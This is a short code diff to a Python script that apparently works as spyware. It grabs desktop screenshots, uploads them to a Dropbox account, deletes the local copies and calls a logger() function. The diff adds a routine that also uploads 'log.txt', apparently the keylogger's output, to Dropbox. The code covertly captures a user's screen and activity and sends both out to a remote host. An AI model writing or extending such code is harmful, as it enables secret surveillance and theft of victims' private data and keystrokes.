@@ -15,6 +15,7 @@ def main():
     get_dropbox_credentials()
     upload_image(image)
     remove_image(image)
+    upload_log_file()
     
 def grab_desktop_image():
     im=ImageGrab.grab()
@@ -46,8 +47,13 @@ def upload_image(file_name):
     with open(file_name, 'rb') as f:
         dbx.files_upload(f.read(),dropbox_path+file_name,mute=True)
 
+def upload_log_file():
+    dropbox_path='/'
+    with open('log.txt', 'rb') as f:
+        dbx.files_upload(f.read(),dropbox_path+'log.txt',mode=dropbox.files.WriteMode.overwrite)
 
 if __name__ == '__main__':
     main()
     logger()
+
 
